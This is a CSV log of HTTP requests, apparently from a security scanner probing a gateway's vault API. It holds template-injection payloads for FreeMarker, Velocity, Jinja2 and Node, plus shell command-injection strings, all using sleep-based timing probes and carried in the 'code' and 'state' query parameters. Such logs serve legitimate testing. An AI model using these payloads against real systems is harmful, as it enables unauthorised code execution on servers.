ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5602,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
5603,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,20,1236,73
5604,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=%7Bsystem%28%22sleep+15%22%29%7D&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,21,1143,464
5605,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,21,1324,30
5606,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,18,1236,41
5607,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,220,1236,73
5608,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,208,1236,41
5609,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,213,1324,30
5610,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,200,OK,227,1143,464
5611,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,21,1236,73
5612,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,19,1236,41
5613,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,200,OK,24,1143,464
5614,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,24,1324,30
5615,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,21,1236,73
5616,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,222,1236,41
5617,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,226,1324,30
5618,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,200,OK,228,1143,464
5619,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,219,1236,73
5620,Sat May 23 22:21:11 WIB 2026,Sat May 23 22:21:11 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,19,1236,41
5621,Sat May 23 22:21:14 WIB 2026,Sat May 23 22:21:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,200,OK,3759,1143,464
5622,Sat May 23 22:21:18 WIB 2026,Sat May 23 22:21:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,200,OK,226,1143,464
5623,Sat May 23 22:21:18 WIB 2026,Sat May 23 22:21:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,200,OK,20,1143,464
5624,Sat May 23 22:21:18 WIB 2026,Sat May 23 22:21:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,200,OK,19,1143,464
5625,Sat May 23 22:21:18 WIB 2026,Sat May 23 22:21:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,200,OK,21,1143,464
5626,Sat May 23 22:21:18 WIB 2026,Sat May 23 22:21:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%3C%25%3D%25x%28sleep+15%29%25%3E,200,OK,20,1143,464
5627,Sat May 23 22:21:18 WIB 2026,Sat May 23 22:21:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%23%7B%25x%28sleep+15%29%7D,200,OK,159,1143,464
5628,Sat May 23 22:21:18 WIB 2026,Sat May 23 22:21:18 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=%7Bsystem%28%22sleep+15%22%29%7D,200,OK,20,1143,464
5629,Sat May 23 22:21:14 WIB 2026,Sat May 23 22:21:18 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,4365,1236,41
5631,Sat May 23 22:21:39 WIB 2026,Sat May 23 22:21:41 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1482,1236,73
5632,Sat May 23 22:21:59 WIB 2026,Sat May 23 22:22:00 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api,403,Forbidden,1021,1069,25
5633,Sat May 23 22:21:59 WIB 2026,Sat May 23 22:22:00 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%3Bsleep+15.0%3B&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,1026,1143,464
5634,Sat May 23 22:22:00 WIB 2026,Sat May 23 22:22:00 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%26sleep+15.0%26%22&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,234,1143,464
5635,Sat May 23 22:22:00 WIB 2026,Sat May 23 22:22:00 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%3Bsleep+15.0%3B%22&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,20,1143,464
5636,Sat May 23 22:22:00 WIB 2026,Sat May 23 22:22:00 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%26sleep+15.0%26%27&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,20,1143,464
5637,Sat May 23 22:22:00 WIB 2026,Sat May 23 22:22:00 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%3Bsleep+15.0%3B%27&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,18,1143,464
5638,Sat May 23 22:22:00 WIB 2026,Sat May 23 22:22:00 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%26timeout+%2FT+15.0&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,21,1143,464
5639,Sat May 23 22:21:59 WIB 2026,Sat May 23 22:22:01 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,1511,1236,41
5640,Sat May 23 22:21:59 WIB 2026,Sat May 23 22:22:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,1514,1236,73
5641,Sat May 23 22:21:59 WIB 2026,Sat May 23 22:22:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,1524,1324,30
5642,Sat May 23 22:22:00 WIB 2026,Sat May 23 22:22:01 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1,403,Forbidden,502,1069,25
5643,Sat May 23 22:22:00 WIB 2026,Sat May 23 22:22:01 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%7Ctimeout+%2FT+15.0&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,185,1143,464
5644,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,239,1236,41
5645,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,258,1236,73
5646,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,252,1324,30
5647,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%26timeout+%2FT+15.0%26%22&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,253,1143,464
5648,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/api/v1/vault,403,Forbidden,253,1171,25
5649,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,249,1236,41
5650,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/assets,301,Moved Permanently,231,758,156
5651,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,248,1236,73
5652,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,247,1324,30
5653,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%7Ctimeout+%2FT+15.0&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,245,1143,464
5654,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,26,1236,41
5655,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,230,1236,73
5656,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,240,1236,41
5657,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:01 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,248,1324,30
5658,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:02 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%26timeout+%2FT+15.0%26%27&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,477,1143,464
5659,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,503,1236,73
5660,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:02 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,486,1236,41
5661,Sat May 23 22:22:01 WIB 2026,Sat May 23 22:22:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,505,1324,30
5662,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,249,1236,73
5664,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%7Ctimeout+%2FT+15.0&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,507,1143,464
5665,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,258,1236,41
5666,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,239,1324,30
5667,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,19,1236,73
5668,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,234,1236,73
5669,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,250,1236,41
5670,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,244,1324,30
5671,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:02 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%3Bstart-sleep+-s+15.0&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,252,1143,464
5672,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,239,1236,73
5673,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,242,1236,41
5674,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%22%3Bstart-sleep+-s+15.0&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,245,1143,464
5675,Sat May 23 22:22:02 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,247,1324,30
5676,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,20,1236,73
5677,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,21,1236,41
5678,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,236,1236,73
5679,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,227,1236,41
5680,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%27%3Bstart-sleep+-s+15.0&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,244,1143,464
5681,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,251,1324,30
5682,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,21,1236,73
5683,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,242,1236,41
5684,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G%3Bstart-sleep+-s+15.0+%23&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D,200,OK,247,1143,464
5685,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,244,1324,30
5686,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,231,1236,73
5687,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,21,1236,41
5688,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%26sleep+15.0%26,200,OK,18,1143,464
5689,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,23,1324,30
5690,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,24,1236,73
5691,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
5692,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,219,1236,73
5693,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,223,1324,30
5694,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,215,1236,41
5695,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%3Bsleep+15.0%3B,200,OK,233,1143,464
5696,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,23,1324,30
5697,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,23,1236,73
5698,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,20,1236,41
5699,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%22%26sleep+15.0%26%22,200,OK,20,1143,464
5700,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,19,1236,73
5701,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,22,1324,30
5702,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%22%3Bsleep+15.0%3B%22,200,OK,21,1143,464
5703,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:03 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,21,1236,41
5704,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,203,1236,73
5705,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/files,403,Forbidden,203,1324,30
5706,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:04 WIB 2026,PUT,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets/ae7509ce-bdf0-480b-a25e-57971e9dacb7,200,OK,201,1236,41
5707,Sat May 23 22:22:03 WIB 2026,Sat May 23 22:22:04 WIB 2026,GET,https://richardgatewayta.duckdns.org:8080/?code=hVecsG6tE7BHK-23UPYl_Z4L-3akzl1znn1Xj4tKp9j3G&state=cVhKSHpZTTRmcmNTVVdNfi5HTXpqQnpHb2V2WUpMTGhoOHpOS2FNZnF6cQ%3D%3D%27%26sleep+15.0%26%27,200,OK,203,1143,464
5708,Sat May 23 22:22:04 WIB 2026,Sat May 23 22:22:04 WIB 2026,POST,https://richardgatewayta.duckdns.org:8080/api/v1/vault/buckets,200,OK,22,1236,73
